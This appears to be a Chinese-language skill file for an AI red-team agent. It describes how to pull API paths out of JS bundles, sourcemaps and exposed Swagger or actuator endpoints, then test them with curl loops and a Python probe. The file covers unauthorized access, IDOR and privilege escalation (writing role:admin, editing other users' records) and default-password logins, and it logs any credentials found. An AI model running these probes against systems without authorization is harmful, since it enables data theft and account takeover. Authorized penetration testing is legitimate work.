---
name: api-endpoint-hunt
description: 接口猎取与未授权验证：从 JS/文档/网关配置里提取 API，做无凭证直连、越权矩阵与批量验证（含限速脚本）
whenToUse: 站点是前后端分离（SPA/小程序/H5）但目录爆破只扫到 403；或已知有后台但进不去，需要从接口侧找未授权读写
role: vuln-scan
enabled: true
---

# 接口猎取（从 JS 里挖出没上鉴权的 API）

前后端分离的站，**页面是壳、数据在接口**。目录爆破扫不到 `/api/v1/order/list` 这种路径，
但它往往就在首页 JS 里写着，而且经常漏鉴权——**这是未授权得分点最集中的地方**。

## 一、先确认这站是不是 API 型

```bash
# 页面骨架里几乎没有业务数据、请求全是 XHR/fetch → API 型
curl -sS 'http://<target>/' | grep -oE '(src|href)="[^"]+\.js[^"]*"' | head -20
# 常见入口文件（挨个试）
for p in /js/app.js /static/js/app.js /assets/index.js /main.js /umi.js /app.[hash].js; do
  curl -sS -o /dev/null -w "$p %{http_code}\n" "http://<target>$p"
done
```

## 二、提取接口（四种来源，按命中率排序）

```bash
# 1) JS 源码直接抓（含 webpack chunk 的懒加载文件）
mkdir -p runs/js && cd runs/js
curl -sS 'http://<target>/' | grep -oE 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//' | sort -u > js-list.txt
while read -r u; do
  f=$(echo "$u" | tr '/?&=' '____'); curl -sS "http://<target>$u" -o "$f"
done < js-list.txt
grep -ohE '"(/[a-zA-Z0-9_\-]+){2,}(/[a-zA-Z0-9_{}\-]+)*"' *.js | tr -d '"' | sort -u > paths.txt
grep -ohE 'https?://[a-zA-Z0-9.\-]+(:[0-9]+)?/[a-zA-Z0-9_/\-]+' *.js | sort -u > absolute.txt
# 2) sourcemap（有 .map 就等于拿到源码和完整接口表）
for j in *.js; do curl -sS -o /dev/null -w "$j.map %{http_code}\n" "http://<target>/$j.map"; done
# 3) 接口文档（很多站生产环境没关）
for p in /swagger-ui.html /swagger-ui/index.html /v2/api-docs /v3/api-docs /openapi.json \
         /doc.html /swagger-resources /api-docs /graphql /actuator/mappings; do
  curl -sS -o /dev/null -w "$p %{http_code}\n" "http://<target>$p"
done
# 4) 网关 / 配置泄露（把上游服务名与路由全暴露出来）
for p in /actuator/gateway/routes /actuator/env /druid/index.html /nacos/v1/ns/service/list; do
  curl -sS -o /dev/null -w "$p %{http_code}\n" "http://<target>$p"
done
```

小程序/H5 额外一条：抓包拿到 `appid` 后，接口域名常在 `https://servicewechat.com/<appid>/<version>/page-frame.html`
里，或直接解包 H5 的 `app-service.js`（技能 `browser-automation` 可无头抓渲染后的 XHR）。

## 三、批量未授权验证（限速、可复现、只看差异）

`runs/api-probe.py`（每接口三态：无凭证 / 低权 / 高权，只看状态码与长度差异）：

```python
import sys, json, time, requests
BASE = sys.argv[1]                 # http://<target>
paths = [l.strip() for l in open('runs/api-paths.txt') if l.strip()]
H = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
for p in paths:
    for auth, extra in (('anon', {}), ('low', {'Authorization': 'Bearer <低权token>'})):
        h = {**H, **extra}
        try:
            r = requests.get(BASE + p, headers=h, timeout=8, verify=False)
        except Exception as e:
            print(f'{auth} ERR  {p}  {e}'); continue
        body = r.text[:120].replace('\n', ' ')
        print(f'{auth} {r.status_code} {len(r.content):>7} {p}  {body}')
        time.sleep(0.3)            # 限速：0.3s/请求，别把业务打挂
```

判读规则（**这是全部判断力所在**）：

| 现象 | 结论 |
| --- | --- |
| anon 200 + 业务数据（不是 `{"code":401}`） | 未授权读，记 `unauthorized` |
| anon 200 但 body 是空数组 | 可能鉴权失效但无数据 → 换 ID/加参数再试，别急着记 |
| anon 401/403，low 200 且能看到**别人的** id | 越权 `auth-bypass`（换 id 再确认一次） |
| anon 返回统一错误页 / WAF 页 | 先记"有鉴权"，不算漏洞 |

**只取 1~2 条样本证明能读到**，不要全量遍历（遍历 1000 个用户 = 数据拖库，超出验证范围）。

## 四、越权矩阵（把"能读"升级成"能改"的得分点）

对每个确认可访问的接口，逐项试四种动作（每次只改一个维度）：

```bash
# 读 → 他人的资源
curl -sS -H "Authorization: Bearer <低权>" 'http://<target>/api/order/1001' | head -c 300
# 写 → 改别人的资料（改完立刻改回来，留前后对比作为证据）
curl -sS -X PUT -H "Authorization: Bearer <低权>" -H 'Content-Type: application/json' \
  -d '{"nickname":"sec-test"}' 'http://<target>/api/user/1002'
# 删 → 用不存在的资源试探（不要真删业务数据）
curl -sS -o /dev/null -w '%{http_code}\n' -X DELETE -H "Authorization: Bearer <低权>" 'http://<target>/api/file/0'
# 提权 → 注册/资料接口能否写 role / isAdmin / tenantId
curl -sS -X POST -H 'Content-Type: application/json' -d '{"role":"admin"}' 'http://<target>/api/user/register'
```

`tenantId` / `orgId` / `deptId` 这类参数是**多租户越权**的高发点：把值改成别的租户 ID，
能读到对方数据就是高危。

## 五、从接口打到后台（有账号才算分）

接口里出现 `login` / `admin` / `manage` 前缀时，走这三步：

1. 找登录接口的**返回结构**（token 在哪、有没有 `role` 字段）；
2. 试**默认口令**与**弱口令**（技能 `credential-attack`，先 10 个以内常见组合，别一上来就爆字典）；
3. 登录成功后用浏览器**实际进后台**（技能 `browser-automation`），截图留证 → 才记 `account-admin`。

## 六、落库（强制）

1. 提取到的接口清单落盘 `runs/api-paths.txt`，并把有鉴权缺陷的写进资产 `surface`：
   `redteam_asset_test`（`surface` = "接口 320 个，未授权 4 个：/api/user/list、/api/order/{id}…"）。
2. 每条未授权/越权：`redteam_vuln_add`（`target` 带端口，`evidence` 贴 **anon 200 + 前 200 字节 body**，
   `gained` = `account-admin` / `db-access` / `内网可达`）。
3. 原始请求：`redteam_http_evidence_add`（curl 原文即可）。
4. `redteam_chain_add`：`tool` 写实际 curl/python 命令，`result` 写状态码与长度差异。
5. 有 token/账号 → `redteam_credential_add`（`source=接口泄露`，`tool` 写来源接口）。
